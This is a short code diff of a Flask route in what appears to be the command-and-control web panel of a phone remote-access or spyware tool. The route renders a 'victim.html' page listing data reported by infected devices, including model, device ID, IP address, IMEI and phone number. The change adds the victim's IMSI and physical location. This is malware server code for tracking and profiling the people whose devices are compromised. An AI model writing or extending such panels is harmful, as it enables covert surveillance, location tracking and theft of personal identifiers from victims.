@@ -120,7 +120,7 @@ def log():
 def clients():
     if request.method == 'POST':
         if 'username' in session:
-            return jsonify({'htmlresponse': render_template("victim.html", data= [request.form['model'], request.form['device-id'], request.form['ip-address'], request.form['api'], request.form['imei'], request.form['socketid'], request.form['phone']])}), 200
+            return jsonify({'htmlresponse': render_template("victim.html", data= [request.form['model'], request.form['device-id'], request.form['ip-address'], request.form['api'], request.form['imei'], request.form['socketid'], request.form['phone'], request.form['imsi'], request.form['location']])}), 200
         else:
             return redirect("/login", code=302)
     else:
